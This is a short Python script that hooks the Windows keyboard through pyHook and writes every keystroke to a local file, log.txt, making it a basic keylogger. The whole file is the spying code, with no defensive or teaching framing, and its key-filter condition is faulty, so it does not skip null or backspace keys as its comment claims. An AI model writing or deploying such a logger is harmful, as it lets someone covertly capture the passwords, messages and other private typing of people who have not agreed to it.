#! /usr/bin/env python
import pythoncom
import pyHook

def callLogKeys(event):
    # 0 is for NULL 8 is for Backspace
    if event.Ascii != 0 or 8:
        file=open('log.txt','r+')
        buffer = file.read()
        file.close()
    file = open('log.txt','w')
    recordKeys = chr(event.Ascii)
    # 13 is for Enter
    if event.Ascii == 13:
        recordKeys = '\n'
    buffer = buffer + recordKeys
    file.write(buffer)
    file.close()
hookManager = pyHook.HookManager()
# This calls the function callLogKeys()
hookManager.KeyDown = callLogKeys
hookManager.HookKeyboard()
# Waits 
pythoncom.PumpMessages()
